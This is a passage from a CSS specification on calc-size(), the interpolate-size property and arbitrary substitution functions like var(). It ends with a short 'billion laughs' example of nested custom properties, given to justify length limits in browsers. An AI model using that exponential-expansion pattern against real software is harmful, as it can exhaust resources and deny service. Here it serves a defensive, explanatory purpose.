    Replace every instance of a [\<percentage-token\>](https://www.w3.org/TR/css-syntax-3/#typedef-percentage-token) in <var>calc</var> with (size \* N), where N is the percentage’s value divided by 100. Return <var>calc</var>.

> <strong data-conversion-semantic="note">Note</strong>
>
> Note: For example, 50% + 20px becomes (size \* .5) + 20px.

To <a id="substitute-into-a-calc-size-calculation"></a>substitute into a calc-size calculation <var>calc</var> a value <var>insertion value</var>:

1.  <a id="ref-for-valdef-calc-size-size"></a>

    If <var>calc</var> doesn’t have the [size](#valdef-calc-size-size) keyword in it, do nothing.

2.  <a id="ref-for-valdef-calc-size-size①"></a>

    Otherwise, replace every instance of the [size](#valdef-calc-size-size) keyword in <var>calc</var> with <var>insertion value</var>, wrapped in parentheses.

3.  If this substitution would produce a value larger than an UA-defined limit, return failure.

    <a id="ref-for-funcdef-calc-size①②"></a>

    > <strong data-conversion-semantic="note">Note</strong>
    >
    > Note: This is intentionally identical to the protection against substitution attacks defined for variable substitution; see [CSS Variables 1 § 3.3 Safely Handling Overly-Long Variables](https://www.w3.org/TR/css-variables-1/#long-variables). However, the use-cases for very long [calc-size()](#funcdef-calc-size) values are much less than for long custom properties, so UAs might wish to impose a smaller size limit.

<a id="ref-for-funcdef-calc-size①③"></a>

### <a id="resolving-calc-size"></a>10.2.  Resolving [calc-size()](#funcdef-calc-size)

<a id="ref-for-funcdef-calc-size①④"></a>

<a id="ref-for-calc-size-basis⑦"></a>

<a id="ref-for-valdef-calc-size-any①"></a>

<a id="ref-for-definite②"></a>

A [calc-size()](#funcdef-calc-size) is treated, in all respects, as if it were its [calc-size basis](#calc-size-basis) (with [any](#valdef-calc-size-any) acting as an unspecified [definite](https://www.w3.org/TR/css-sizing-3/#definite) size).

<a id="ref-for-calc-size-basis⑧"></a>

<a id="ref-for-calc-size-calculation⑥"></a>

<a id="ref-for-valdef-calc-size-size②"></a>

When actually performing layout calculations, however, the size represented by its [calc-size basis](#calc-size-basis) is modified to be the value of its [calc-size calculation](#calc-size-calculation), with the [size](#valdef-calc-size-size) keyword evaluating to the <a id="ref-for-calc-size-basis⑨"></a>calc-size basis’s original size.

<a id="ref-for-calc-size-basis①⓪"></a>

<a id="ref-for-funcdef-calc-size①⑤"></a>

<a id="ref-for-definite③"></a>

<a id="ref-for-calc-size-calculation⑦"></a>

(If the [calc-size basis](#calc-size-basis) is <a id="valdef-calc-size-any"></a>any, the [calc-size()](#funcdef-calc-size) is a [definite](https://www.w3.org/TR/css-sizing-3/#definite) length, equal to its [calc-size calculation](#calc-size-calculation).)

<a id="ref-for-propdef-height②"></a>

> <strong data-conversion-semantic="example">Example</strong>
>
> <a id="example-7fcb8b17"></a> For example, an element with [height: calc-size(auto, round(up, size, 20px))](https://www.w3.org/TR/css-sizing-3/#propdef-height) will be treated identically to an element with <a id="ref-for-propdef-height③"></a>height: auto, but with its size rounded up to the nearest multiple of 20px.

<a id="ref-for-calc-size-calculation⑧"></a>

When evaluating the [calc-size calculation](#calc-size-calculation), if percentages are not definite in the given context, they resolve to 0px. Otherwise, they resolve as normal.

<a id="ref-for-calc-size-basis①①"></a>

<a id="ref-for-calc-size-calculation⑨"></a>

<a id="ref-for-valdef-calc-size-size③"></a>

<a id="ref-for-behave-as-auto"></a>

(A percentage in the [calc-size basis](#calc-size-basis) is treated differently; [simplification](#simplifying-calc-size) moves the percentage into the [calc-size calculation](#calc-size-calculation) and replaces it with [size](#valdef-calc-size-size) references. The <a id="ref-for-calc-size-basis①②"></a>calc-size basis then becomes 100%, behaving as whatever 100% would normally do in that context, including possibly making a property [behave as auto](https://www.w3.org/TR/css-sizing-3/#behave-as-auto), etc.)

<a id="ref-for-funcdef-calc-size①⑥"></a>

<a id="ref-for-definite④"></a>

<a id="ref-for-behave-as-auto①"></a>

> <strong data-conversion-semantic="note">Note</strong>
>
> Percentages in the basis work as normal so you can always smoothly transition to <em>any</em> size, regardless of its value or behavior. For example, without [calc-size()](#funcdef-calc-size), transitioning from 100% to 0px only works smoothly if the percentage is [definite](https://www.w3.org/TR/css-sizing-3/#definite); if it’s not, then during the entire transition the property might [behave as auto](https://www.w3.org/TR/css-sizing-3/#behave-as-auto) and not actually change size at all.
>
> <a id="ref-for-funcdef-calc-size①⑦"></a>
>
> <a id="ref-for-valdef-width-min-content①"></a>
>
> Percentages in the calculation, on the other hand, are resolved to 0 when indefinite to avoid making the [calc-size()](#funcdef-calc-size) potentially act in two different ways; there are some cases where a [min-content](https://www.w3.org/TR/css-sizing-3/#valdef-width-min-content) size will cause different layout effects than a 100% size, and so a <a id="ref-for-funcdef-calc-size①⑧"></a>calc-size() has to masquerade as one or the other.

<a id="ref-for-funcdef-calc-size①⑨"></a>

### <a id="interp-calc-size"></a>10.3.  Interpolating [calc-size()](#funcdef-calc-size)

<a id="ref-for-funcdef-calc-size②⓪"></a>

<a id="ref-for-calc-size-canonicalize-for-interpolation"></a>

Two [calc-size()](#funcdef-calc-size) functions can be interpolated if (after being [canonicalized for interpolation](#calc-size-canonicalize-for-interpolation)):

<a id="ref-for-calc-size-canonicalize-for-interpolation①"></a>

Either function returned failure from being [canonicalized for interpolation](#calc-size-canonicalize-for-interpolation)

The values cannot be interpolated.

<a id="ref-for-calc-size-basis①③"></a>

Both [calc-size basises](#calc-size-basis) are identical

<a id="ref-for-calc-size-basis①④"></a>

The result’s [calc-size basis](#calc-size-basis) is the that basis value.

<a id="ref-for-valdef-calc-size-any②"></a>

<a id="ref-for-calc-size-basis①⑤"></a>

Either [calc-size basis](#calc-size-basis) is [any](#valdef-calc-size-any)

<a id="ref-for-calc-size-basis①⑥"></a>

<a id="ref-for-valdef-calc-size-any③"></a>

The result’s [calc-size basis](#calc-size-basis) is the non-[any](#valdef-calc-size-any) basis.

<a id="ref-for-calc-size-calculation①⓪"></a>

The result’s [calc-size calculation](#calc-size-calculation) is the interpolation of the two input <a id="ref-for-calc-size-calculation①①"></a>calc-size calculations.

<a id="ref-for-funcdef-calc-size②①"></a>

<a id="ref-for-valdef-width-min-content②"></a>

<a id="ref-for-valdef-width-max-content"></a>

<a id="ref-for-valdef-width-auto③"></a>

> <strong data-conversion-semantic="note">Note</strong>
>
> Note: These interpolation restrictions ensure that a [calc-size()](#funcdef-calc-size) doesn’t try to act in two different ways at once; there are some cases where a [min-content](https://www.w3.org/TR/css-sizing-3/#valdef-width-min-content) and [max-content](https://www.w3.org/TR/css-sizing-3/#valdef-width-max-content) would produce different layout behaviors, for example, so the <a id="ref-for-funcdef-calc-size②②"></a>calc-size() has to masquerade as one or the other. This, unfortunately, means you can’t transition between keywords, like going from [auto](https://www.w3.org/TR/css-sizing-3/#valdef-width-auto) to <a id="ref-for-valdef-width-min-content③"></a>min-content.

<a id="ref-for-funcdef-calc-size②③"></a>

<a id="ref-for-typedef-length-percentage②⓪"></a>

<a id="ref-for-typedef-intrinsic-size-keyword①"></a>

<a id="ref-for-typedef-calc-sum②④"></a>

Some [calc-size()](#funcdef-calc-size) values can also be interpolated with a [\<length-percentage\>](https://www.w3.org/TR/css-values-4/#typedef-length-percentage) or an [\<intrinsic-size-keyword\>](#typedef-intrinsic-size-keyword). To determine whether the values can interpolate and what the interpolation behavior is, treat the non-<a id="ref-for-funcdef-calc-size②④"></a>calc-size() value as calc-size(any, <var>value</var> ) if the value is a [\<calc-sum\>](https://www.w3.org/TR/css-values-4/#typedef-calc-sum) or as calc-size( <var>value</var> , size) otherwise, and apply the rules above.

<a id="ref-for-funcdef-calc-size②⑤"></a>

<a id="ref-for-propdef-height④"></a>

> <strong data-conversion-semantic="example">Example</strong>
>
> <a id="example-4f69fe99"></a> For example, [calc-size()](#funcdef-calc-size) allows interpolation to/from [height: auto](https://www.w3.org/TR/css-sizing-3/#propdef-height):
>
> ```css
> details {
>   transition: height 1s;
> }
> details::details-content {
>   display: block;
> }
> details[open]::details-content {
>   height: auto;
> }
> details:not([open])::details-content {
>   height: calc-size(any, 0px);
> }
> ```
>
> <a id="ref-for-the-details-element"></a>
>
> <a id="ref-for-propdef-height⑤"></a>
>
> This will implicitly interpolate between calc-size(auto, size) and calc-size(any, 0px). Half a second after opening the <code><a href="https://html.spec.whatwg.org/multipage/interactive-elements.html#the-details-element">details</a></code>, the ::details-content wrapper’s [height](https://www.w3.org/TR/css-sizing-3/#propdef-height) will be calc-size(auto, size \* .5), half its open size; thruout the transition it’ll smoothly animate its height.

<a id="ref-for-funcdef-calc-size②⑥"></a>

<a id="ref-for-definite⑤"></a>

> <strong data-conversion-semantic="note">Note</strong>
>
> Note: [calc-size()](#funcdef-calc-size) is designed such that transitioning to/from calc-size(any, [definite](https://www.w3.org/TR/css-sizing-3/#definite) length) will <em>always</em> work smoothly, regardless of how the other side of the transition is specified.

<a id="ref-for-funcdef-calc-size②⑦"></a>

<a id="ref-for-typedef-length-percentage②①"></a>

<a id="ref-for-calc-size-calculation①②"></a>

<a id="ref-for-definite⑥"></a>

<a id="ref-for-calc-size-basis①⑦"></a>

> <strong data-conversion-semantic="note">Note</strong>
>
> Note: This "upgrade a plain value into a [calc-size()](#funcdef-calc-size)" behavior puts [\<length-percentage\>](https://www.w3.org/TR/css-values-4/#typedef-length-percentage) values into the [calc-size calculation](#calc-size-calculation). This allows values with percentages to interpolate with intrinsic size keywords, but does mean that when a percentage isn’t [definite](https://www.w3.org/TR/css-sizing-3/#definite), it’ll resolve to zero. If you want to resolve to the actual size the percentage would make the element, explicitly write a <a id="ref-for-funcdef-calc-size②⑧"></a>calc-size() with the value in its [calc-size basis](#calc-size-basis), like calc-size(50%, size).

<a id="ref-for-propdef-interpolate-size"></a>

### <a id="interpolate-size"></a>10.4.  Interpolating sizing keywords: the [interpolate-size](#propdef-interpolate-size) property

<a id="ref-for-valdef-width-auto④"></a>

<a id="ref-for-valdef-width-min-content④"></a>

<a id="ref-for-propdef-interpolate-size①"></a>

> <strong data-conversion-semantic="note">Note</strong>
>
> Note: If we had a time machine, this property wouldn’t need to exist. It exists because many existing style sheets assume that intrinsic sizing keywords (such as [auto](https://www.w3.org/TR/css-sizing-3/#valdef-width-auto), [min-content](https://www.w3.org/TR/css-sizing-3/#valdef-width-min-content), etc.) cannot animate. Therefore this property exists to allow style sheets to choose to get the expected behavior. Specifying [interpolate-size: allow-keywords](#propdef-interpolate-size) on the root element chooses the new behavior for the entire page. We suggest doing this whenever compatibility isn’t an issue.

| Field               | Definition                                                                                        |
|---------------------|---------------------------------------------------------------------------------------------------|
| <strong>Name:&#xA;      </strong> | <a id="propdef-interpolate-size"></a>interpolate-size                                                               |
| <strong><a href="https://www.w3.org/TR/css-values/#value-defs">Value:</a>&#xA;      </strong> | <a id="ref-for-comb-one①⓪⑥"></a>numeric-only [\|](https://www.w3.org/TR/css-values-4/#comb-one) allow-keywords |
| <strong><a href="https://www.w3.org/TR/css-cascade/#initial-values">Initial:</a>&#xA;      </strong> | numeric-only                                                                                      |
| <strong><a href="https://www.w3.org/TR/css-cascade/#applies-to">Applies to:</a>&#xA;      </strong> | [all elements](https://www.w3.org/TR/css-pseudo/#generated-content)                               |
| <strong><a href="https://www.w3.org/TR/css-cascade/#inherited-property">Inherited:</a>&#xA;      </strong> | yes                                                                                               |
| <strong><a href="https://www.w3.org/TR/css-values/#percentages">Percentages:</a>&#xA;      </strong> | n/a                                                                                               |
| <strong><a href="https://www.w3.org/TR/css-cascade/#computed">Computed value:</a>&#xA;      </strong> | as specified                                                                                      |
| <strong><a href="https://www.w3.org/TR/cssom/#serializing-css-values">Canonical order:</a>&#xA;      </strong> | per grammar                                                                                       |
| <strong><a href="https://www.w3.org/TR/web-animations/#animation-type">Animation type:</a>&#xA;      </strong> | not animatable                                                                                    |

<a id="valdef-interpolate-size-numeric-only"></a>numeric-only  
<a id="ref-for-typedef-intrinsic-size-keyword②"></a>

An [\<intrinsic-size-keyword\>](#typedef-intrinsic-size-keyword) cannot be interpolated.

<a id="valdef-interpolate-size-allow-keywords"></a>allow-keywords  
<a id="ref-for-typedef-length-percentage②②"></a>

<a id="ref-for-typedef-intrinsic-size-keyword③"></a>

Two values can be interpolated if one of them is an [\<intrinsic-size-keyword\>](#typedef-intrinsic-size-keyword) and the other is a [\<length-percentage\>](https://www.w3.org/TR/css-values-4/#typedef-length-percentage). This is done by treating the <a id="ref-for-typedef-intrinsic-size-keyword④"></a>\<intrinsic-size-keyword\> <var>keyword</var> as though it is calc-size(<var>keyword</var>, size) and applying the rules in [§ 10.3 Interpolating calc-size()](#interp-calc-size). In other cases, an <a id="ref-for-typedef-intrinsic-size-keyword⑤"></a>\<intrinsic-size-keyword\> still cannot be interpolated.

<a id="ref-for-propdef-interpolate-size②"></a>

<a id="ref-for-after-change-style"></a>

The value of [interpolate-size](#propdef-interpolate-size) that matters is the computed value on the element at the time the animation might start. For CSS transitions, this means the value in the [after-change style](https://www.w3.org/TR/css-transitions-1/#after-change-style). An animation is not stopped or started later because <a id="ref-for-propdef-interpolate-size③"></a>interpolate-size changes.

## <a id="arbitrary-substitution"></a> Appendix A: Arbitrary Substitution Functions

<a id="ref-for-functional-notation①①"></a>

<a id="ref-for-computed-value②⓪"></a>

An <a id="arbitrary-substitution-function"></a>arbitrary substitution function is a [functional notation](https://www.w3.org/TR/css-values-4/#functional-notation) that will, when resolved, substitute itself with other values that are potentially unknowable at parse time—​and must therefore be parsed while resolving its [computed value](https://www.w3.org/TR/css-cascade-5/#computed-value).

<a id="ref-for-arbitrary-substitution-function⑦"></a>

<a id="ref-for-computed-value②①"></a>

<a id="ref-for-valdef-all-unset"></a>

<a id="ref-for-cascade"></a>

> <strong data-conversion-semantic="note">Note</strong>
>
> Note: Since [arbitrary substitution functions](#arbitrary-substitution-function) resolve at [computed value](https://www.w3.org/TR/css-cascade-5/#computed-value) time, if the resulting value after substitution is invalid, the property falls back (essentially) to [unset](https://www.w3.org/TR/css-cascade-5/#valdef-all-unset) behavior, rather than falling back to an earlier value in the [cascade](https://www.w3.org/TR/css-cascade-6/#cascade) the way declarations invalid at parse time do. See [Invalid Substitution](#invalid-substitution).

<a id="ref-for-arbitrary-substitution-function⑧"></a>

<a id="ref-for-functional-notation①②"></a>

Unless otherwise specified, [arbitrary substitution functions](#arbitrary-substitution-function) can be used in place of any part of any property’s value (including within other [functional notations](https://www.w3.org/TR/css-values-4/#functional-notation)); and are not valid in any other context.

> <strong data-conversion-semantic="issue">Issue</strong>
>
> <a id="issue-2cf4bbb3"></a> Should any of these functions be valid in contexts outside of properties?

> <strong data-conversion-semantic="example">Example</strong>
>
> <a id="example-43a8c543"></a> For example, the following code incorrectly attempts to use a variable as a property name:
>
> ```text
> .foo {
>   --side: margin-top;
>   var(--side): 20px;
> }
> ```
>
> <a id="ref-for-propdef-margin-top"></a>
>
> This is <em>not</em> equivalent to setting [margin-top: 20px;](https://www.w3.org/TR/css-box-4/#propdef-margin-top). Instead, the second declaration is simply thrown away as a syntax error for having an invalid property name.

<a id="ref-for-arbitrary-substitution-function⑨"></a>

If a property value contains one or more [arbitrary substitution functions](#arbitrary-substitution-function), and those functions are themselves syntactically valid, the entire value’s grammar must be assumed to be valid at parse time.

<a id="ref-for-arbitrary-substitution-function①⓪"></a>

<a id="ref-for-substitute-arbitrary-substitution-function①"></a>

<a id="ref-for-computed-value②②"></a>

<a id="ref-for-invalid-at-computed-value-time③"></a>

[Arbitrary substitution functions](#arbitrary-substitution-function) are [substituted](#substitute-arbitrary-substitution-function) during style [computation](https://www.w3.org/TR/css-cascade-5/#computed-value), before any other value transformations or introspection can occur. If a property, after <a id="ref-for-substitute-arbitrary-substitution-function②"></a>substitution, does not match its declared grammar, the declaration is [invalid at computed-value time](#invalid-at-computed-value-time).

<a id="ref-for-substitute-arbitrary-substitution-function③"></a>

<a id="ref-for-css-wide-keywords①"></a>

<a id="ref-for-specified-value②"></a>

If a property value, after [substitution](#substitute-arbitrary-substitution-function), contains only a single [CSS-wide keyword](https://www.w3.org/TR/css-values-4/#css-wide-keywords) (and possibly whitespace/comments), its value is determined as if that keyword were its [specified value](https://www.w3.org/TR/css-cascade-5/#specified-value) all along.

> <strong data-conversion-semantic="example">Example</strong>
>
> <a id="example-b87fa983"></a> For example, the following usage is fine from a syntax standpoint, but results in nonsense when the variable is substituted in:
>
> ```text
> :root { --looks-valid: 20px; }
> p { background-color: var(--looks-valid); }
> ```
>
> <a id="ref-for-propdef-background-color"></a>
>
> <a id="ref-for-invalid-at-computed-value-time④"></a>
>
> <a id="ref-for-valdef-color-transparent"></a>
>
> <a id="ref-for-initial-value"></a>
>
> Since 20px is an invalid value for [background-color](https://www.w3.org/TR/css-backgrounds-3/#propdef-background-color), the property becomes [invalid at computed-value time](#invalid-at-computed-value-time), and instead resolves to [transparent](https://www.w3.org/TR/css-color-4/#valdef-color-transparent) (the [initial value](https://www.w3.org/TR/css-cascade-5/#initial-value) for <a id="ref-for-propdef-background-color①"></a>background-color).
>
> <a id="ref-for-propdef-color"></a>
>
> If the property was one that’s inherited by default, such as [color](https://www.w3.org/TR/css-color-4/#propdef-color), it would compute to the inherited value rather than the initial value.

<a id="ref-for-funcdef-var⑨"></a>

<a id="ref-for-css-wide-keywords②"></a>

<a id="ref-for-custom-property④"></a>

> <strong data-conversion-semantic="example">Example</strong>
>
> <a id="example-7afce32e"></a> While a [var()](https://www.w3.org/TR/css-variables-1/#funcdef-var) function can’t get a [CSS-wide keyword](https://www.w3.org/TR/css-values-4/#css-wide-keywords) from the [custom property](https://www.w3.org/TR/css-variables-1/#custom-property) itself—​if you tried to specify that, like --foo: initial;, it would just trigger [explicit defaulting](https://www.w3.org/TR/css-cascade-4/#defaulting-keywords) for the custom property—​it can have a <a id="ref-for-css-wide-keywords③"></a>CSS-wide keyword in its fallback:
>
> ```text
> p { color: var(--does-not-exist, initial); }
> ```
>
> <a id="ref-for-invalid-at-computed-value-time⑤"></a>
>
> <a id="ref-for-funcdef-var①⓪"></a>
>
> <a id="ref-for-valdef-all-initial"></a>
>
> <a id="ref-for-propdef-color①"></a>
>
> In the above code, if the --does-not-exist property didn’t exist or is [invalid at computed-value time](#invalid-at-computed-value-time), the [var()](https://www.w3.org/TR/css-variables-1/#funcdef-var) will instead substitute in the [initial](https://www.w3.org/TR/css-cascade-5/#valdef-all-initial) keyword, making the property behave as if it was originally [color: initial](https://www.w3.org/TR/css-color-4/#propdef-color). This will make it take on the document’s initial <a id="ref-for-propdef-color②"></a>color value, rather than defaulting to inheritance, as it would if there were no fallback.

<a id="ref-for-arbitrary-substitution-function①①"></a>

<a id="ref-for-guaranteed-invalid-value⑧"></a>

<a id="ref-for-substitute-arbitrary-substitution-function④"></a>

Each [arbitrary substitution function](#arbitrary-substitution-function) must define how to <a id="resolve-an-arbitrary-substitution-function"></a>resolve an arbitrary substitution function for itself, returning optional <var>result</var> and <var>fallback</var> values. The <var>result</var> is used to replace the function as long as it does not contain the [guaranteed-invalid value](https://www.w3.org/TR/css-variables-1/#guaranteed-invalid-value); the <var>fallback</var> is used otherwise. (The <var>fallback</var> does not need to be resolved in any way; [substitution](#substitute-arbitrary-substitution-function) will handle that if it’s actually used.)

> <strong data-conversion-semantic="note">Note</strong>
>
> Note: See, for example, resolve a var() function.

To <a id="substitute-arbitrary-substitution-function"></a>substitute arbitrary substitution functions in a <var>value</var>:

1.  <a id="ref-for-list-iterate"></a>

    <a id="ref-for-arbitrary-substitution-function①②"></a>

    [For each](https://infra.spec.whatwg.org/#list-iterate) [arbitrary substitution function](#arbitrary-substitution-function) <var>func</var> in <var>value</var>:

    1.  <a id="ref-for-resolve"></a>

        [Resolve](https://webidl.spec.whatwg.org/#resolve) <var>func</var>. Let <var>result</var> be the returned result, and <var>fallback</var> be the returned fallback.

        <a id="ref-for-guaranteed-invalid-value⑨"></a>

        If no <var>result</var> was returned, set <var>result</var> to the [guaranteed-invalid value](https://www.w3.org/TR/css-variables-1/#guaranteed-invalid-value). If no <var>fallback</var> was returned, set <var>fallback</var> to the <a id="ref-for-guaranteed-invalid-value①⓪"></a>guaranteed-invalid value.

    2.  <a id="ref-for-guaranteed-invalid-value①①"></a>

        If <var>result</var> does not contain the [guaranteed-invalid value](https://www.w3.org/TR/css-variables-1/#guaranteed-invalid-value)

        Replace <var>func</var> in <var>value</var> with <var>result</var>.

        <a id="ref-for-guaranteed-invalid-value①②"></a>

        Otherwise, if <var>fallback</var> does not contain the [guaranteed-invalid value](https://www.w3.org/TR/css-variables-1/#guaranteed-invalid-value)

        Replace <var>func</var> in <var>value</var> with <var>fallback</var>.

        Otherwise

        <a id="ref-for-guaranteed-invalid-value①③"></a>

        Replace all of <var>value</var> with the [guaranteed-invalid value](https://www.w3.org/TR/css-variables-1/#guaranteed-invalid-value). Exit this algorithm.

2.  <a id="ref-for-arbitrary-substitution-function①③"></a>

    If there are still [arbitrary substitution functions](#arbitrary-substitution-function) in <var>value</var> (due to substitution), repeat the previous step.

3.  <a id="ref-for-guaranteed-invalid-value①④"></a>

    Grammar-check <var>value</var> according to its context as normal. If it is not valid at this point, replace <var>value</var> with the [guaranteed-invalid value](https://www.w3.org/TR/css-variables-1/#guaranteed-invalid-value).

<a id="ref-for-substitute-arbitrary-substitution-function⑤"></a>

> <strong data-conversion-semantic="note">Note</strong>
>
> Note that [substitution](#substitute-arbitrary-substitution-function) takes place at the level of CSS tokens [\[css-syntax-3\]](#biblio-css-syntax-3), not at a textual level; you can’t build up a single token where part of it is provided by a variable:
>
> ```text
> .foo {
>   --gap: 20;
>   margin-top: var(--gap)px;
> }
> ```
>
> <a id="ref-for-propdef-margin-top①"></a>
>
> <a id="ref-for-funcdef-calc⑧"></a>
>
> This is <em>not</em> equivalent to setting [margin-top: 20px;](https://www.w3.org/TR/css-box-4/#propdef-margin-top) (a length). Instead, it’s equivalent to <a id="ref-for-propdef-margin-top②"></a>margin-top: 20 px; (a number followed by an ident), which is simply an invalid value for the <a id="ref-for-propdef-margin-top③"></a>margin-top property. Note, though, that [calc()](https://www.w3.org/TR/css-values-4/#funcdef-calc) can be used to validly achieve the same thing, like so:
>
> ```text
> .foo {
>   --gap: 20;
>   margin-top: calc(var(--gap) * 1px);
> }
> ```
>
> This also implies that the post-substitution value might not be directly serializable as-is. Here’s a similar example to the preceding:
>
> ```text
> .foo {
>   --gap: 20;
>   --not-px-length: var(--gap)px;
> }
> ```
>
> The serialization of the computed (post-substitution) value of --not-px-length is <strong>not</strong> 20px, because that would parse back as the single combined dimension; instead, it will serialize with a comment between the two tokens, like px, to enforce that they are separate tokens even when re-parsing.

### <a id="invalid-substitution"></a> Invalid Substitution<a id="invalid-variables"></a>

<a id="ref-for-substitute-arbitrary-substitution-function⑥"></a>

<a id="ref-for-guaranteed-invalid-value①⑤"></a>

When [substitution](#substitute-arbitrary-substitution-function) results in a property’s value containing the [guaranteed-invalid value](https://www.w3.org/TR/css-variables-1/#guaranteed-invalid-value), this makes the declaration <a id="invalid-at-computed-value-time"></a>invalid at computed-value time. When this happens, the computed value is one of the following depending on the property’s type:

<a id="ref-for-custom-property⑤"></a>

The property is a non-registered [custom property](https://www.w3.org/TR/css-variables-1/#custom-property)

<a id="ref-for-universal-syntax-definition①"></a>

<a id="ref-for-registered-custom-property⑤"></a>

The property is a [registered custom property](https://www.w3.org/TR/css-properties-values-api-1/#registered-custom-property) with [universal syntax](https://www.w3.org/TR/css-properties-values-api-1/#universal-syntax-definition)

<a id="ref-for-guaranteed-invalid-value①⑥"></a>

The computed value is the [guaranteed-invalid value](https://www.w3.org/TR/css-variables-1/#guaranteed-invalid-value).

Otherwise

<a id="ref-for-valdef-all-unset①"></a>

Either the property’s inherited value or its initial value depending on whether the property is inherited or not, respectively, as if the property’s value had been specified as the [unset](https://www.w3.org/TR/css-cascade-5/#valdef-all-unset) keyword.

> <strong data-conversion-semantic="example">Example</strong>
>
> <a id="example-53e4f9d5"></a> For example, in the following code:
>
> ```text
> :root { --not-a-color: 20px; }
> p { background-color: red; }
> p { background-color: var(--not-a-color); }
> ```
>
> <a id="ref-for-propdef-background-color②"></a>
>
> <a id="ref-for-custom-property⑥"></a>
>
> <a id="ref-for-funcdef-var①①"></a>
>
> the \<p\> elements will have transparent backgrounds (the initial value for [background-color](https://www.w3.org/TR/css-backgrounds-3/#propdef-background-color)), rather than red backgrounds. The same would happen if the [custom property](https://www.w3.org/TR/css-variables-1/#custom-property) itself was unset, or contained an invalid [var()](https://www.w3.org/TR/css-variables-1/#funcdef-var) function.
>
> <a id="ref-for-propdef-background-color③"></a>
>
> Note the difference between this and what happens if the author had just written [background-color: 20px](https://www.w3.org/TR/css-backgrounds-3/#propdef-background-color) directly in their stylesheet - that would be a normal syntax error, which would cause the rule to be discarded, so the <a id="ref-for-propdef-background-color④"></a>background-color: red rule would be used instead.

<a id="ref-for-invalid-at-computed-value-time⑥"></a>

<a id="ref-for-arbitrary-substitution-function①④"></a>

> <strong data-conversion-semantic="note">Note</strong>
>
> Note: The [invalid at computed-value time](#invalid-at-computed-value-time) concept exists because [arbitrary substitution functions](#arbitrary-substitution-function) can’t "fail early" like other syntax errors can, so by the time the user agent realizes a property value is invalid, it’s already thrown away the other cascaded values.

### <a id="substitution-in-shorthands"></a> Substitution in Shorthand Properties<a id="variables-in-shorthands"></a>

<a id="ref-for-arbitrary-substitution-function①⑤"></a>

<a id="ref-for-shorthand-property②"></a>

[Arbitrary substitution functions](#arbitrary-substitution-function) produce some complications when parsing [shorthand properties](https://www.w3.org/TR/css-cascade-5/#shorthand-property) into their component longhands, and when serializing <a id="ref-for-shorthand-property③"></a>shorthand properties <em>from</em> their component longhands.

<a id="ref-for-shorthand-property④"></a>

<a id="ref-for-arbitrary-substitution-function①⑥"></a>

<a id="ref-for-longhand"></a>

<a id="ref-for-substitute-arbitrary-substitution-function⑦"></a>

If a [shorthand property](https://www.w3.org/TR/css-cascade-5/#shorthand-property) contains an [arbitrary substitution function](#arbitrary-substitution-function) in its value, the [longhand properties](https://www.w3.org/TR/css-cascade-5/#longhand) it’s associated with must instead be filled in with a special, unobservable-to-authors <a id="pending-substitution-value"></a>pending-substitution value that indicates the shorthand contains an <a id="ref-for-arbitrary-substitution-function①⑦"></a>arbitrary substitution function, and thus the longhand’s value can’t be determined until after [substituted](#substitute-arbitrary-substitution-function).

<a id="ref-for-substitute-arbitrary-substitution-function⑧"></a>

This value must then be cascaded as normal, and at computed-value time, after [substitution](#substitute-arbitrary-substitution-function), the shorthand must be parsed and the longhands must be given their appropriate values at that point.

<a id="ref-for-arbitrary-substitution-function①⑧"></a>

<a id="ref-for-longhand①"></a>

<a id="ref-for-cascade①"></a>

<a id="ref-for-shorthand-property⑤"></a>

<a id="ref-for-funcdef-var①②"></a>

> <strong data-conversion-semantic="note">Note</strong>
>
> Note: When a shorthand is written without an [arbitrary substitution function](#arbitrary-substitution-function), it is parsed and separated out into its component [longhand properties](https://www.w3.org/TR/css-cascade-5/#longhand) at parse time; the longhands then participate in the [cascade](https://www.w3.org/TR/css-cascade-6/#cascade), with the [shorthand property](https://www.w3.org/TR/css-cascade-5/#shorthand-property) more or less discarded. When the shorthand contains a [var()](https://www.w3.org/TR/css-variables-1/#funcdef-var), however, this can’t be done, as the <a id="ref-for-funcdef-var①③"></a>var() could be substituted with anything.

<a id="ref-for-pending-substitution-value"></a>

[Pending-substitution values](#pending-substitution-value) must be serialized as the empty string, if an API allows them to be observed.

------------------------------------------------------------------------

<a id="ref-for-shorthand-property⑥"></a>

<a id="ref-for-longhand②"></a>

[Shorthand properties](https://www.w3.org/TR/css-cascade-5/#shorthand-property) are serialized by gathering the values of their component [longhand properties](https://www.w3.org/TR/css-cascade-5/#longhand), and synthesizing a value that will parse into the same set of values.

<a id="ref-for-longhand③"></a>

<a id="ref-for-shorthand-property⑦"></a>

<a id="ref-for-pending-substitution-value①"></a>

<a id="ref-for-arbitrary-substitution-function①⑨"></a>

If all of the component [longhand properties](https://www.w3.org/TR/css-cascade-5/#longhand) for a given [shorthand](https://www.w3.org/TR/css-cascade-5/#shorthand-property) are [pending-substitution values](#pending-substitution-value) from the same original shorthand value, the <a id="ref-for-shorthand-property⑧"></a>shorthand property must serialize to that original ([arbitrary substitution function](#arbitrary-substitution-function)-containing) value.

<a id="ref-for-longhand④"></a>

<a id="ref-for-shorthand-property⑨"></a>

<a id="ref-for-pending-substitution-value②"></a>

<a id="ref-for-arbitrary-substitution-function②⓪"></a>

<a id="ref-for-substitute-arbitrary-substitution-function⑨"></a>

Otherwise, if any of the component [longhand properties](https://www.w3.org/TR/css-cascade-5/#longhand) for a given [shorthand](https://www.w3.org/TR/css-cascade-5/#shorthand-property) are [pending-substitution values](#pending-substitution-value), or contain [arbitrary substitution functions](#arbitrary-substitution-function) of their own that have not yet been [substituted](#substitute-arbitrary-substitution-function), the <a id="ref-for-shorthand-property①⓪"></a>shorthand property must serialize to the empty string.

### <a id="long-substitution"></a> Safely Handling Overly-Long Substitution<a id="long-variables"></a>

<a id="ref-for-arbitrary-substitution-function②①"></a>

<a id="ref-for-funcdef-var①④"></a>

Naively implemented, some [arbitrary substitution functions](#arbitrary-substitution-function) (such as [var()](https://www.w3.org/TR/css-variables-1/#funcdef-var)) can be used in a variation of the "billion laughs attack":

> <strong data-conversion-semantic="example">Example</strong>
>
> <a id="example-9c9258de"></a>
>
> ```text
> .foo {
>   --prop1: lol;
>   --prop2: var(--prop1) var(--prop1);
>   --prop3: var(--prop2) var(--prop2);
>   --prop4: var(--prop3) var(--prop3);
>   /* etc */
> }
> ```
>
> In this short example, --prop4’s computed value is lol lol lol lol lol lol lol lol, containing 8 copies of the original lol. Every additional level added to this doubles the number of identifiers; extending it to a mere 30 levels, the work of a few minutes by hand, would make --prop30 contain <em>nearly a billion instances</em> of the identifier.

<a id="ref-for-arbitrary-substitution-function②②"></a>

